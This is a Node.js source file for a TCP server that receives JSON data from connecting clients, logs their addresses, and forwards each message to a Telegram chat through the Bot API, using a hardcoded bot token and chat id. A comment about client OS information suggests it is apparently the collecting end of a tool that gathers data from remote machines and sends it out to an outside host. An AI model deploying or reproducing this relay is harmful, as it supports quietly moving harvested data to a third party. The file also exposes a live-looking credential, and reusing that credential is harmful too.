const net = require('net');
const https = require('https');
const argv = process.argv;

const tok = "6097240873:AAE7CP1UG46n54QjVGSfnN5pv7NQW6_Kfuw";
const chat = "5483232752";
const host = "127.0.0.1";

// Server Side
const server = net.createServer((socket) => {
  // Get client information
  const clientAddress = socket.remoteAddress;
  const clientPort = socket.remotePort;
  
  // Send client OS information
  
  
  // Handle client data
  socket.on('data', (data) => {
    // Handle client data here
    console.log(`Client Address: ${clientAddress}`);
    console.log(`Client Port: ${clientPort}`);
    console.log(JSON.parse(data));
    const url = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${chat}&text=${data.toString()}`
    https.get(url, (res) => {
        console.log(res.statusCode);
    })
  });
  
  // Handle client disconnection
  socket.on('end', () => {
    // Handle client disconnection here
    console.log("END");
  });
});

// Start the server

if (argv.includes('--port')){
    const port = argv[argv.indexOf('--port')+1]

    if (port === undefined){
        console.log('You Are Not set Port');
        console.log("Continue With port: 3000");
        server.listen(3000, () => {
            console.log('Server listening on port: 3000');
          });
    }else{
        server.listen(parseInt(port), () => {
            console.log(`Server listening on port: ${port}`);
          });
    }
}else{
    server.listen(3000, host, () => {
        console.log('Server listening on port: 3000');
    });
}
